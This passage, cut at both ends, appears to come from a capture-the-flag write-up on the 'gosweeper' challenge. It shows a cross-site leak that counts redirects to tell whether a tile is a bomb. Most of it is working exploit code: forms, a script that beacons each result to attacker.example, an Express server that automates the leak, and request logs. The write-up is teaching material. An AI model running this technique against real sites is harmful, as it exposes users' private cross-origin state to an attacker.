+Therefore, to know if a redirect is successful or not, we just have to poll
+the <code>w.window</code> object and check if it becomes null; if it does, we have lost access
+to the window reference, meaning the redirect was successful (and there is no bomb).</p>
+<p>In order to achieve the 19 redirects (well, 18, since opening the new tab also counts
+as a redirect, apparently) before the final destination, we can use
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://xsinator.com/testing.html#Max%20Redirect%20Leak">XSLeaks’ own demo service</a>, which provides us with the
+<code>https://xsinator.com/testcases/files/maxredirect.php?n=18&amp;url=&lt;url&gt;</code> endpoint
+(I’ve tried creating my own with Caddy, but it ended up not being reliable in the
+challenge’s instance).</p>
+<pre data-lang="html" style="background-color:#2b2c2f;color:#cccece;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">form </span><span style="color:#bb80b3;">id</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">form-guess</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">method</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">post</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">action</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">https://gosweeper.example/guess</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">target</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">_blank</span><span style="color:#5fb3b3;">&quot;&gt;
+</span><span>  </span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">input </span><span style="color:#bb80b3;">type</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">hidden</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">name</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">guess</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">value</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">0</span><span style="color:#5fb3b3;">&quot; /&gt;
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">form</span><span style="color:#5fb3b3;">&gt;
+</span><span>
+</span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">form </span><span style="color:#bb80b3;">id</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">form-redirect</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">method</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">get</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">action</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">https://xsinator.com/testcases/files/maxredirect.php</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">target</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">redirect-window</span><span style="color:#5fb3b3;">&quot;&gt;
+</span><span>  </span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">input </span><span style="color:#bb80b3;">type</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">hidden</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">name</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">n</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">value</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">18</span><span style="color:#5fb3b3;">&quot; /&gt;
+</span><span>  </span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">input </span><span style="color:#bb80b3;">type</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">hidden</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">name</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">url</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">value</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">https://gosweeper.example/board</span><span style="color:#5fb3b3;">&quot; /&gt;
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">form</span><span style="color:#5fb3b3;">&gt;
+</span><span>
+</span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span><span>  </span><span style="color:#c594c5;">const </span><span>sleep </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">t </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">new </span><span style="color:#fac863;">Promise</span><span style="color:#5fb3b3;">((</span><span style="color:#f99157;">resolve</span><span style="color:#5fb3b3;">) </span><span style="color:#c594c5;">=&gt; </span><span style="color:#6699cc;">setTimeout</span><span style="color:#5fb3b3;">(</span><span>resolve</span><span style="color:#5fb3b3;">, </span><span>t</span><span style="color:#5fb3b3;">));
+</span><span>
+</span><span>  </span><span style="color:#c594c5;">const </span><span>callback </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">w </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">{
+</span><mark style="background-color:#3e4044;"><span>    </span><span style="color:#c594c5;">const </span><span>result </span><span style="color:#5fb3b3;">= </span><span>w</span><span style="color:#5fb3b3;">.</span><span>window </span><span style="color:#5fb3b3;">== </span><span style="color:#f99157;">null </span><span style="color:#5fb3b3;">? &#39;</span><span style="color:#99c794;">safe</span><span style="color:#5fb3b3;">&#39; : &#39;</span><span style="color:#99c794;">bomb</span><span style="color:#5fb3b3;">&#39;;
+</span></mark><span>    </span><span style="color:#fac863;">navigator</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">sendBeacon</span><span style="color:#5fb3b3;">(`</span><span style="color:#99c794;">https://attacker.example/callback/</span><span style="color:#5fb3b3;">${</span><span>result</span><span style="color:#5fb3b3;">}`);
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>  </span><span style="color:#c594c5;">let </span><span>w </span><span style="color:#5fb3b3;">= </span><span style="color:#fac863;">window</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">open</span><span style="color:#5fb3b3;">(&#39;&#39;, &#39;</span><span style="color:#99c794;">redirect-window</span><span style="color:#5fb3b3;">&#39;);
+</span><span>
+</span><span>  </span><span style="color:#c594c5;">const </span><span>leak </span><span style="color:#5fb3b3;">= </span><span style="color:#c594c5;">async </span><span style="color:#5fb3b3;">() </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#fac863;">document</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">getElementById</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">form-redirect</span><span style="color:#5fb3b3;">&#39;).</span><span style="color:#6699cc;">submit</span><span style="color:#5fb3b3;">();
+</span><span>    </span><span style="color:#c594c5;">await </span><span style="color:#6699cc;">sleep</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">2500</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#6699cc;">callback</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#c594c5;">await </span><span style="color:#6699cc;">sleep</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">100</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#6699cc;">callback</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#c594c5;">await </span><span style="color:#6699cc;">sleep</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">100</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#6699cc;">callback</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#5f6364;">// (repeat a few times)
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span>
+</span><span>  </span><span style="color:#fac863;">window</span><span style="color:#5fb3b3;">.</span><span style="color:#fac863;">opener</span><span style="color:#5fb3b3;">.</span><span>onunload </span><span style="color:#5fb3b3;">= () </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#fac863;">document</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">getElementById</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">form-guess</span><span style="color:#5fb3b3;">&#39;).</span><span style="color:#6699cc;">submit</span><span style="color:#5fb3b3;">()
+</span><span style="color:#6699cc;">    leak</span><span style="color:#5fb3b3;">();
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span></code></pre>
+<p>Notice some optimisations that were made in order to make sure we always™ get the
+correct result:</p>
+<ul>
+<li>A new tab is open as soon as the page is loaded, even before the <code>window.opener.onunload</code>
+event handler is fired, in order to reduce the time it takes to initiate the request of
+the redirects;</li>
+<li>The redirects are <em>slow</em>, so starting them at the same time as the guess is not a problem
+and also helps with making sure it finishes within the 4 seconds that we have;</li>
+<li>We first wait 2.5 seconds after sending back the status of the window, but in some cases
+this might not be enough time for all the redirects to finish, so we keep sending requests
+at 100ms intervals afterwards (until the browser process is abruptly terminated).</li>
+</ul>
+<p>This correctly identifies whether the tile is a bomb.
+Here is a log of the request in case of a bomb:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[DEBUG] What follows is a list of all the requests which have been performed by the browser:
+</span><span>// ...
+</span><span>[DEBUG]   - 302 https://gosweeper.example/clone?cloneid=something&amp;redirect=//attacker.example
+</span><span>[DEBUG]   - 200 https://attacker.example/
+</span><span>[DEBUG]   - 200 https://gosweeper.example/clone?cloneid=fe24ecea6cf48d9604127b1204bb24fd
+</span><span>[DEBUG]   - 200 https://attacker.example/persist.html
+</span><span>[DEBUG]   - 404 https://attacker.example/favicon.ico
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
+</span><span>[DEBUG]   - 200 https://gosweeper.example/board?xray=1
+</span><span>[DEBUG]   - 200 https://gosweeper.example/guess
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
+</span><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=18&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><span>// ...
+</span><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=4&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><mark style="background-color:#3e4044;"><span>[DEBUG]   - 200 https://attacker.example/callback/bomb
+</span></mark><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=3&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=2&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=1&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=0&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><mark style="background-color:#3e4044;"><span>[DEBUG]   - 302 https://gosweeper.example/board
+</span></mark><mark style="background-color:#3e4044;"><span>[DEBUG]   - 200 https://attacker.example/callback/bomb
+</span></mark></code></pre>
+<p>And here is the same thing when it is a safe spot:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[DEBUG] What follows is a list of all the requests which have been performed by the browser:
+</span><span>// ...
+</span><span>[DEBUG]   - 302 https://gosweeper.example/clone?cloneid=something&amp;redirect=//attacker.example
+</span><span>[DEBUG]   - 200 https://attacker.example/
+</span><span>[DEBUG]   - 200 https://gosweeper.example/clone?cloneid=fe24ecea6cf48d9604127b1204bb24fd
+</span><span>[DEBUG]   - 200 https://attacker.example/persist.html
+</span><span>[DEBUG]   - 404 https://attacker.example/favicon.ico
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
+</span><span>[DEBUG]   - 200 https://gosweeper.example/board?xray=1
+</span><span>[DEBUG]   - 200 https://gosweeper.example/guess
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
+</span><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=18&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><span>// ...
+</span><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=4&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><mark style="background-color:#3e4044;"><span>[DEBUG]   - 200 https://attacker.example/callback/bomb
+</span></mark><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=3&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=2&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=1&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><span>[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=0&amp;url=https%3A%2F%2Fgosweeper.example%2Fboard
+</span><mark style="background-color:#3e4044;"><span>[DEBUG]   - 200 https://gosweeper.example/board
+</span></mark><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
+</span><mark style="background-color:#3e4044;"><span>[DEBUG]   - 200 https://attacker.example/callback/safe
+</span></mark></code></pre>
+<p>Awesome! Now we just need to put this together to be able to quickly know
+whether any tile of our choosing is a bomb.</p>
+<h2 id="tying-it-all-together">Tying It All Together</h2>
+<p>To more efficiently trigger the bomb oracle, we can create a Node.js app using
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://expressjs.com/">Express</a> and <a rel="noopener nofollow noreferrer" target="_blank" href="https://mustache.github.io/">Mustache</a> that receives the tile to be explored through the
+redirect, and prints the outcome of the callback:</p>
+<pre data-lang="js" style="background-color:#2b2c2f;color:#cccece;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#c594c5;">import </span><span>express </span><span style="color:#c594c5;">from </span><span style="color:#5fb3b3;">&#39;</span><span style="color:#99c794;">express</span><span style="color:#5fb3b3;">&#39;;
+</span><span style="color:#c594c5;">import </span><span>mustacheExpress </span><span style="color:#c594c5;">from </span><span style="color:#5fb3b3;">&#39;</span><span style="color:#99c794;">mustache-express</span><span style="color:#5fb3b3;">&#39;;
+</span><span>
+</span><span style="color:#c594c5;">const </span><span>CHALL_HOST </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">https://gosweeper.example</span><span style="color:#5fb3b3;">&quot;;
+</span><span style="color:#c594c5;">const </span><span>CALLBACK_URL </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">https://attacker.example/xsleaks-callback</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span style="color:#c594c5;">const </span><span>userId </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">fe24ecea6cf48d9604127b1204bb24fd</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span style="color:#c594c5;">const </span><span>app </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">express</span><span>()</span><span style="color:#5fb3b3;">;
+</span><span style="color:#c594c5;">const </span><span>port </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">3000</span><span style="color:#5fb3b3;">;
+</span><span>
+</span><span>app</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">engine</span><span>(</span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">mustache</span><span style="color:#5fb3b3;">&quot;, </span><span style="color:#6699cc;">mustacheExpress</span><span>())</span><span style="color:#5fb3b3;">;
+</span><span>
+</span><span>app</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">set</span><span>(</span><span style="color:#5fb3b3;">&#39;</span><span style="color:#99c794;">views</span><span style="color:#5fb3b3;">&#39;, &quot;</span><span style="color:#99c794;">./templates</span><span style="color:#5fb3b3;">&quot;</span><span>)</span><span style="color:#5fb3b3;">;
+</span><span>app</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">set</span><span>(</span><span style="color:#5fb3b3;">&#39;</span><span style="color:#99c794;">view engine</span><span style="color:#5fb3b3;">&#39;, &#39;</span><span style="color:#99c794;">mustache</span><span style="color:#5fb3b3;">&#39;</span><span>)</span><span style="color:#5fb3b3;">;
+</span><span>
+</span><span>app</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">get</span><span>(</span><span style="color:#5fb3b3;">&#39;</span><span style="color:#99c794;">/entry/:tile</span><span style="color:#5fb3b3;">&#39;, (</span><span style="color:#f99157;">req</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">res</span><span style="color:#5fb3b3;">) </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#c594c5;">const </span><span style="color:#5fb3b3;">{ </span><span>tile </span><span style="color:#5fb3b3;">} = </span><span>req</span><span style="color:#5fb3b3;">.</span><span>params</span><span style="color:#5fb3b3;">;
+</span><span>  res</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">render</span><span>(</span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">entry</span><span style="color:#5fb3b3;">&quot;, { </span><span>CHALL_HOST</span><span style="color:#5fb3b3;">, </span><span>userId</span><span style="color:#5fb3b3;">, </span><span>tile </span><span style="color:#5fb3b3;">}</span><span>)</span><span style="color:#5fb3b3;">;
+</span><span style="color:#5fb3b3;">}</span><span>)</span><span style="color:#5fb3b3;">;
+</span><span>
+</span><span>app</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">get</span><span>(</span><span style="color:#5fb3b3;">&#39;</span><span style="color:#99c794;">/xsleaks/:tile</span><span style="color:#5fb3b3;">&#39;, (</span><span style="color:#f99157;">req</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">res</span><span style="color:#5fb3b3;">) </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#c594c5;">const </span><span style="color:#5fb3b3;">{ </span><span>tile </span><span style="color:#5fb3b3;">} = </span><span>req</span><span style="color:#5fb3b3;">.</span><span>params</span><span style="color:#5fb3b3;">;
+</span><span>  res</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">render</span><span>(</span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">xsleaks</span><span style="color:#5fb3b3;">&quot;, { </span><span>CHALL_HOST</span><span style="color:#5fb3b3;">, </span><span>CALLBACK_URL</span><span style="color:#5fb3b3;">, </span><span>tile </span><span style="color:#5fb3b3;">}</span><span>)</span><span style="color:#5fb3b3;">;
+</span><span style="color:#5fb3b3;">}</span><span>)</span><span style="color:#5fb3b3;">;
+</span><span>
+</span><span>app</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">post</span><span>(</span><span style="color:#5fb3b3;">&#39;</span><span style="color:#99c794;">/xsleaks-callback/:result</span><span style="color:#5fb3b3;">&#39;, (</span><span style="color:#f99157;">req</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">res</span><span style="color:#5fb3b3;">) </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#c594c5;">const </span><span style="color:#5fb3b3;">{ </span><span>result </span><span style="color:#5fb3b3;">} = </span><span>req</span><span style="color:#5fb3b3;">.</span><span>params</span><span style="color:#5fb3b3;">;
+</span><span>  </span><span style="color:#fac863;">console</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">log</span><span>(result)</span><span style="color:#5fb3b3;">;
+</span><span>  res</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">status</span><span>(</span><span style="color:#f99157;">200</span><span>)</span><span style="color:#5fb3b3;">;
+</span><span>  res</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">end</span><span>()</span><span style="color:#5fb3b3;">;
+</span><span style="color:#5fb3b3;">}</span><span>)</span><span style="color:#5fb3b3;">;
+</span><span>
+</span><span>app</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">listen</span><span>(port</span><span style="color:#5fb3b3;">, () </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#fac863;">console</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">log</span><span>(</span><span style="color:#5fb3b3;">`</span><span style="color:#99c794;">Listening on port </span><span style="color:#5fb3b3;">${</span><span>port</span><span style="color:#5fb3b3;">}`</span><span>)</span><span style="color:#5fb3b3;">;
+</span><span style="color:#5fb3b3;">}</span><span>)</span><span style="color:#5fb3b3;">;
+</span></code></pre>
+<details>
+<summary>Mustache templates</summary>
+<p><code>templates/entry.mustache</code>:</p>
+<pre data-lang="html" style="background-color:#2b2c2f;color:#cccece;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">form </span><span style="color:#bb80b3;">id</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">form-clone</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">method</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">get</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">action</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">{{CHALL_HOST}}/clone</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">target</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">_blank</span><span style="color:#5fb3b3;">&quot;&gt;
+</span><span>  </span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">input </span><span style="color:#bb80b3;">type</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">hidden</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">name</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">cloneid</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">value</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">{{userId}}</span><span style="color:#5fb3b3;">&quot; /&gt;
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">form</span><span style="color:#5fb3b3;">&gt;
+</span><span>
+</span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span><span>  </span><span style="color:#fac863;">document</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">getElementById</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">form-clone</span><span style="color:#5fb3b3;">&#39;).</span><span style="color:#6699cc;">submit</span><span style="color:#5fb3b3;">();
+</span><span>  </span><span style="color:#fac863;">window</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">open</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">/xsleaks/{{tile}}</span><span style="color:#5fb3b3;">&#39;);
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span></code></pre>
+<p><code>templates/xsleaks.mustache</code>:</p>
+<pre data-lang="html" style="background-color:#2b2c2f;color:#cccece;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">form </span><span style="color:#bb80b3;">id</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">form-guess</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">method</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">post</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">action</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">{{CHALL_HOST}}/guess</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">target</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">_blank</span><span style="color:#5fb3b3;">&quot;&gt;
+</span><span>  </span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">input </span><span style="color:#bb80b3;">type</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">hidden</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">name</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">guess</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">value</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">{{tile}}</span><span style="color:#5fb3b3;">&quot; /&gt;
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">form</span><span style="color:#5fb3b3;">&gt;
+</span><span>
+</span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">form </span><span style="color:#bb80b3;">id</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">form-callback</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">method</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">get</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">action</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">https://xsinator.com/testcases/files/maxredirect.php</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">target</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">redirect-window</span><span style="color:#5fb3b3;">&quot;&gt;
+</span><span>  </span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">input </span><span style="color:#bb80b3;">type</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">hidden</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">name</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">n</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">value</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">18</span><span style="color:#5fb3b3;">&quot; /&gt;
+</span><span>  </span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">input </span><span style="color:#bb80b3;">type</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">hidden</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">name</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">url</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">value</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">{{CHALL_HOST}}/board</span><span style="color:#5fb3b3;">&quot; /&gt;
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">form</span><span style="color:#5fb3b3;">&gt;
+</span><span>
+</span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span><span>  </span><span style="color:#c594c5;">const </span><span>sleep </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">t </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">new </span><span style="color:#fac863;">Promise</span><span style="color:#5fb3b3;">((</span><span style="color:#f99157;">resolve</span><span style="color:#5fb3b3;">) </span><span style="color:#c594c5;">=&gt; </span><span style="color:#6699cc;">setTimeout</span><span style="color:#5fb3b3;">(</span><span>resolve</span><span style="color:#5fb3b3;">, </span><span>t</span><span style="color:#5fb3b3;">));
+</span><span>
+</span><span>  </span><span style="color:#c594c5;">const </span><span>callback </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">w </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#c594c5;">const </span><span>result </span><span style="color:#5fb3b3;">= </span><span>w</span><span style="color:#5fb3b3;">.</span><span>window </span><span style="color:#5fb3b3;">== </span><span style="color:#f99157;">null </span><span style="color:#5fb3b3;">? &#39;</span><span style="color:#99c794;">safe</span><span style="color:#5fb3b3;">&#39; : &#39;</span><span style="color:#99c794;">bomb</span><span style="color:#5fb3b3;">&#39;;
+</span><span>    </span><span style="color:#fac863;">navigator</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">sendBeacon</span><span style="color:#5fb3b3;">(`</span><span style="color:#99c794;">{{{CALLBACK_URL}}}/</span><span style="color:#5fb3b3;">${</span><span>result</span><span style="color:#5fb3b3;">}`);
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
